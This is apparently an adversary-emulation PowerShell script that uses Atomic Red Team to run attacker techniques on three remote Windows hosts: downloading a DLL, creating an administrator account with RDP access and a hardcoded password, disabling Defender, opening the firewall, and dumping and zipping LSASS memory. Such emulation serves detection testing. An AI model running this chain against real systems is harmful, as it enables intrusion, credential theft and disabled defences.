#Import Invoke-Atomic
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psm1"

#Create a multi-enpoint PS Session and store
$sesh = New-PSSession -ComputerName PC-01,PC-02,PC-03 -Credential (Get-Credential)

#Create Scheduled Task
$sch_arg = @{'time' = '10:59'}
Invoke-AtomicTest T1078.001 -TestGuids 42f53695-ad4a-4546-abb6-7d837f644a71 -InputArgs $sch_arg

#Download DLL from remote source
$dll_arg = @{
    'remote_file' = 'https://github.com/redcanaryco/atomic-red-team/blob/597a0cead409e577e3e2261a7a596ba51c0f610a/atomics/T1218/src/x64/T1218.dll'; 
    'local_path' = 'c:\Atomic.dll'
    }
Invoke-AtomicTest T1105 -TestGuids c01cad7f-7a4c-49df-985e-b190dcf6a279 -Session $sesh -InputArgs $dll_arg


#Create local account then enable it with RDP access
$acct_args = @{
    'username' = 'AtomicUser'; 
    'password' = 'P@ssw0rd123412'
    }
Invoke-AtomicTest T1136.001 -TestGuids 6657864e-0323-4206-9344-ac9cd7265a4f -Session $sesh -InputArgs $acct_args

##Enable local account and add to RDP group
$rdp_args = @{
    'guest_user' = 'AtomicUser'; 
    'guest_password' = 'P@ssw0rd123412'; 
    'local_admin_group' = 'Administrators'; 
    'remote_desktop_users_group' = 'Remote Desktop Users'; 
    'remove_rd_access_during_cleanup' = 1
    }
Invoke-AtomicTest T1078.001 -TestGuids 99747561-ed8d-47f2-9c91-1e5fde1ed6e0 -Session $sesh -InputArgs $rdp_args

#Disable Defender
Invoke-AtomicTest T1562.001 -TestGuids 6b8df440-51ec-4d53-bf83-899591c9b5d7 -Session $sesh

#Add firewall rule for RDP access
Invoke-AtomicTest T156.004 -TestGuids d9841bf8-f161-4c73-81e9-fd773a5ff8c1 -Session $sesh

#Create a dmp of LSASS then Compress

##Use comsvcs minidump
Invoke-AtomicTest T1003.001 -TestGuids 2536dee2-12fb-459a-8c37-971844fa73be 

##Compress with PowerShell
$zip_args = @{
    'input_file' = '$env:TEMP\lsass-comsvcs.dmp'; 
    'output_file' = '$env:TEMP\lsass.zip'
    }
Invoke-AtomicTest T1560 -TestGuids 41410c60-614d-4b9d-b66e-b0192dd9c597 -InputArgs $zip_args